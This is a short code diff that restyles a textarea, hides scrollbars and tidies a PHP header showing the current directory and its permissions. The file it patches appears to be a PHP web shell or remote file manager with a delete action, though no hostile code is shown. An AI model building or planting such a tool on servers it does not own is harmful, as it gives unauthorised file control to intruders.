@@ -130,16 +130,35 @@ textarea {
   margin-right:10px;
   margin-top:10px;
   margin-bottom:-2px;
-  width:100%;
+  width:96%;
   resize:none;
   border-radius:20px;
   height:400px;
   color:#8a8a8a;
+  padding: 12px 20px;
   -moz-border-bottom-colors: none;
   -moz-border-left-colors: none;
   -moz-border-right-colors: none;
   -moz-border-top-colors: none;
   outline:none;
+}
+  ::-webkit-scrollbar {
+  width: 0px;
+  height: 0px;
+}
+  ::-webkit-scrollbar-button:start:decrement,
+  ::-webkit-scrollbar-button:end:increment  {
+  height: 0px;
+  background-color: transparent;
+}
+  ::-webkit-scrollbar-track-piece  {
+  background-color: #eeeeee;
+}
+  ::-webkit-scrollbar-thumb:vertical {
+  height: 0px;
+  background-color: #666;
+  border: 0px solid #eee;
+  -webkit-border-radius: 16px;
 }
 
 input[type=submit] {
@@ -1149,7 +1168,9 @@ if ($_GET['do'] == 'delete')
       </th>
     </tr>
     <tr>
-      <th colspan="5"><?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )</th>
+      <th colspan="5">
+            <?php print pwd() ?> ( <?php permission(cwd(), perms(cwd())) ?> )
+      </th>
     </tr>
   </thead>
   <tbody>
